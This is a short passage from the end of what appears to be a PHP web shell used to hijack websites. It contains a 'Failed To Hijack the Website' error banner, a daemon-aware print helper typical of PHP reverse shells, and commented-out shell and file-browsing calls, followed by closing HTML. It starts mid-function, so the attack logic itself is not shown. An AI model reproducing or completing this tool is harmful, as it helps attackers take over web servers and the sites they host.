echo "<center><p><b><font color='red'>Failed To Hijack the Website :(</font></p></b></center>";
}
}
}


function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}



	// Shell =======================================================
	// navegar($diretorio);
	// listar($diretorio);
	?>
	
</div>

</body>
</html>
